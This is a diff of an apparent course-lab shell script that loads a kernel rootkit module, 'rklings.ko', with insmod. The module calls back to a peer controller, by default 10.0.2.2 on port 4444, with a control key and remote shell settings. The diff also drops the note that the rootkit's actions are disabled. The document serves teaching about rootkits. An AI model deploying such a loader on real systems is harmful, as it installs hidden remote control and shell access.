@@ -10,7 +10,6 @@ peer=${2:-}
 control_port=${3:-}
 shell_port=${4:-}
 
-request=/etc/modules-load.d/rklings.conf
 show()
 {
 	ui_transcript "$*"
@@ -23,25 +22,20 @@ run()
 }
 
 ui_heading 'Completed course rootkit'
-ui_field 'Control' "$peer:$control_port"
-ui_field 'Shell' "$peer:$shell_port"
+ui_field 'Control' "localhost:4444"
 
 run mkdir -p /etc/modules-load.d
 run chmod 0700 /etc/modules-load.d
 
 run ifconfig lo 127.0.0.1 up
-command='insmod /rklings/rklings.ko'
-command="$command peer_address=$peer peer_port=$control_port"
-command="$command retry_base_ms=25 retry_max_ms=200"
-command="$command control_key=<redacted> shell_timeout_ms=300000"
-show "$command"
+show "insmod /rklings/rklings.ko peer_address=... peer_port=... control_key=<redacted>"
 insmod /rklings/rklings.ko \
-	"peer_address=$peer" \
-	"peer_port=$control_port" \
-	retry_base_ms=25 \
-	retry_max_ms=200 \
+	"peer_address=${peer:-10.0.2.2}" \
+	"peer_port=${control_port:-4444}" \
 	"control_key=$key" \
-	shell_timeout_ms=300000
+	"retry_base_ms=5000" \
+	"retry_max_ms=60000" \
+	"shell_timeout_ms=60000"
 
-ui_success 'Complete rootkit loaded with actions disabled'
+ui_success 'Complete rootkit loaded'
 ui_progress 'Use the host operator prompt to inspect and control it'
